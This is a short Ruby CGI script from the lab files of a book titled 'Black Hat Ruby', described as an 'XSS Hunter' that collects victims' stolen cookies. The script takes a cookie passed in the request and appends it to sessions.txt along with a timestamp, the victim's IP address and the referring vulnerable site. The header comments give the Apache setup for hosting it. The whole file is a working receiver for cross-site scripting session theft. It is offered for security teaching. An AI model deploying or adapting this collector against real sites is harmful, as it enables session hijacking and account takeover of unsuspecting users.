#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   CGI-based XSS Hunter to store victims' stolen cookies
# Requirements:
#   apt install apache2
#   cp xss-hunter-cgi.rb /var/www/html/
#   chmod 755 /var/www/html/xss-hunter-cgi.rb
#   cd /etc/apache2/mods-enabled
#   ln -s ../mods-available/cgid.conf .
#   ln -s ../mods-available/cgid.load .
#   ln -s ../mods-available/cgi.load .
#   service apache2 restart
#
#
require 'cgi'
require 'uri'


cgi  = CGI.new
cgi.header                  # content type 'text/html'
cookie = URI.encode cgi['cookie']
time   = Time.now.strftime("%D %T")

file = 'sessions.txt'
File.open(file, "a") do |f|
  f.puts time               # Time of receiving the get request
  f.puts URI.decode(cookie) # The data    # The data
  f.puts cgi.remote_addr    # Remote user IP
  f.puts cgi.referer        # The vulnerable site URL
  f.puts "---------------------------"
end
File.chmod(0200, file)      # To prevent public access to the log file

puts ""
